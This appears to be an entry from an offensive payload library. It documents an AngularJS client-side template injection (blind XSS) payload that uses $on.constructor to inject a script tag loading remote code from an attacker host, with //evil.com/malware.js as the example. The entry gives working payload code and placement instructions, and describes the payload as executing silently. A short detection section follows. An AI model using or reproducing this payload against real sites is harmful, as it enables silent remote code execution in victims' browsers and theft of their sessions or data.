---
id: 06cbb34b-5b3a-4fd2-b3d3-fabc7bafef98
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.760270+00:00'
updated_at: '2023-04-10T20:24:53.221835+00:00'
tags:
  - CSTI
  - Blind XSS
  - AngularJS
platforms:
  - Web
  - Browser
validated: true
---

# AngularJS-On-Constructor-Script-Injection

## Code

```javascript
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

## Description

This payload targets AngularJS event scopes by hijacking the $on method's constructor to execute JavaScript that injects a script tag loading an external payload. Useful for blind CSTI in event-driven template contexts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost/m | Attacker's script URL | //evil.com/malware.js |

## Usage

Place in template-interpolated inputs within AngularJS event handlers. The payload executes silently, appending the script to the body for remote code loading.

## Detection

- CSP alerts for dynamic script insertions.
- Anomalous $on method calls in AngularJS debug logs.
- Client-side network traces to non-whitelisted domains.

## Related

- [[procedures/Client-Side-Template-Injection-using-Blind-XSS]]
